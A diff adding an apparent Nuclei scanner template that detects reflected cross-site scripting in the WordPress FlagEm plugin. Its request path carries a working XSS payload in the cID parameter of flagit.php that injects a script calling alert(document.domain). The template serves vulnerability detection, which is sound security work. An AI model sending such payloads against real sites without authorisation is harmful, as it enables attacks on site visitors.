@@ -1,0 +1,25 @@
+id: wp-flagem-xss
+info:
+  author: daffainfo
+  name: WordPress Plugin FlagEm - Reflected Cross-Site Scripting (XSS)
+  reference:
+  - https://www.exploit-db.com/exploits/38674
+  severity: medium
+  tags: wordpress,xss,wp-plugin
+requests:
+- matchers:
+  - part: body
+    type: word
+    words:
+    - </script><script>alert(document.domain)</script>
+  - part: header
+    type: word
+    words:
+    - text/html
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/wp-content/plugins/FlagEm/flagit.php?cID=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
